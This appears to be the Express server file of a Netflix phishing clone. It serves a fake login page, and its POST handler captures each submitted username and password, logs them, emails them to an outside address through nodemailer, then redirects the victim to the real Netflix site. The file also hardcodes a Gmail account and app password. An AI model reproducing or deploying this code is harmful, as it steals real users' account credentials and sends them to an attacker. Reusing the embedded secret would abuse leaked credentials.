var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var nodemailer = require('nodemailer');
app.use(bodyParser.urlencoded({extended:true}));
app.use(express.static('library'))

app.get("/",function(req,res){
  res.sendFile('./views/login.html',{root:__dirname})

});

app.post("/success",function(req,res){
    var transporter = nodemailer.createTransport({
        service: 'gmail',
         auth: {
          user: 'hammamiwissem21@gmail.com',
          pass: 'wywfvfwsrynhlvpg'
        }
      });

    var username = req.body.username;
    var password = req.body.password;
    password = JSON.stringify(password,null,2);
    username = JSON.stringify(username,null,2);
    console.log(username+"->"+password);
    var data = username+"->"+password+"  \n";
    
    var mailOptions = {
        from: 'Mailing Test',
        to: 'me@wissem-hammami.ovh',
        subject: 'mail from the netflix clone',
        text: `the username is ${username}and the password is ${password}`
      };
    
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
    res.redirect("https://www.netflix.com/")
});
app.listen(3000,function(){
    console.log("Server listening on port 3000");
});
